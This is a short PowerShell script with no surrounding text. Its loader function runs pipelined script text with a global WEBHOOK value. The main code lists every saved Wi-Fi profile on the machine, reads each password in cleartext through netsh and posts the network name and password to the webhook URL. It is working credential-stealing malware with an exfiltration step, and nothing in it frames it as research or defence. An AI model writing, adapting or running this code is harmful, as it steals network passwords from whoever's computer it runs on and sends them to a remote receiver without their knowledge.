function loader {
    param(
        [Parameter(ValueFromPipeline = $true)]
        [string]$ScriptText,

        [string]$WEBHOOK
    )

    if (-not $ScriptText) {
     
        return
    }


    Set-Variable -Name "WEBHOOK" -Value $WEBHOOK -Scope Global

  
    $block = [ScriptBlock]::Create($ScriptText)

    
    & $block
}






$profiles = netsh wlan show profile |
            Select-String "All User Profile" |
            ForEach-Object {
                ($_ -split ":",2)[1].Trim()
            }

foreach ($PROFILE_NAME in $profiles) {

    $passLine = netsh wlan show profile $PROFILE_NAME key=clear |
                Select-String "Key Content"

    if ($passLine) {
        $PASSWORD = ($passLine -split ":",2)[1].Trim()

        if ($PASSWORD -ne "") {
            $PAYLOAD = @{
    content = "Network: $PROFILE_NAME Password: $PASSWORD"
} | ConvertTo-Json

Invoke-RestMethod -Uri $WEBHOOK `
    -Method Post `
    -ContentType "application/json" `
    -Body $PAYLOAD | Out-Null
        }
        
    }
    
}


